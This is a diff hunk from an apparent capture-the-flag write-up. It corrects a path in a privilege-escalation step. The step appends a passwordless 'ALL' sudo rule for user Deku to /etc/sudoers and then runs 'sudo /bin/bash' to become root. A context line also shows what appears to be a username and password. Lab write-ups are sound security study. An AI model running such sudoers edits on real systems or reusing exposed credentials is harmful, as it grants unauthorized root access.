@@ -161,7 +161,7 @@ deku:One?For?All_!!one1/A
 </br> 
 </br> I can't execute commands, but apparently I can write or append to files with the shovel `>>` operator.
 ![canoing43](https://github.com/user-attachments/assets/9bbd3b8a-d203-444c-9f04-3c3c56bc0a03)
-</br> `Deku ALL-NOPASSWD: ALL >> /ec/sudoers`
+</br> `Deku ALL-NOPASSWD: ALL >> /etc/sudoers`
 </br> give user Deku the ability to run anything as superuser without any password.
  </br>
 </br> sudo /bin/bash to simply become root
